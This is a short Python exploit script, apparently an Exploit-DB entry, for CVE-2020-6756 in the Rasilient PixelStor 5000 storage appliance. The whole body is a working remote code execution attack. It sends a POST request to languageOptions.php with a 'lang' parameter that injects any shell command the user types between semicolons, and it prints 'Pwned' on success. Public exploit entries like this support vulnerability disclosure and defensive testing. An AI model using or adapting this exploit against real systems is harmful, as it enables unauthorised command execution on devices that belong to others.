# Exploit Title: PixelStor 5000 - Remote Code Execution
# Product: PixelStor 5000
# Vendor: Rasilient
# Date: 2020-01-08
# Exploit Author: .:UND3R:.
# Vendor Homepage: http://rasilient.com
# Version: K:4.0.1580-20150629 (KDI Version)
# Tested on: K:4.0.1580-20150629 (KDI Version)
# CVE: CVE-2020-6756
# URL Author: https://pwnedchile.com
# Thanks: Dani Pelotocino <3, Roit

import requests, sys

def poc(target, cmd):
	url = target + "/Option/languageOptions.php"
	headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	data = {"lang": ";" + cmd + ";/bin/echo -n en"}
	r = requests.post(url, headers=headers, data=data)
	if(r.status_code == 200):
		print("\nPwned :]")
	else:
		print("\nNot vulnerable :(")

print("PixelStor 5000 RCE exploit\nVersion: K:4.0.1580-20150629 (KDI Version)\n\nAuthor: .:UND3R:.\nURL: https://pwnedchile.com\nThanks: Dani Pelotocino <3")

if len(sys.argv) !=2:
    print("\n[+] Usage: python " + sys.argv[0] + " <url>\n")
    sys.exit(1)

if __name__ == "__main__":
	url = sys.argv[1]
	cmd = raw_input("\n[Linux Command]:")
	poc(url, cmd)
#EoF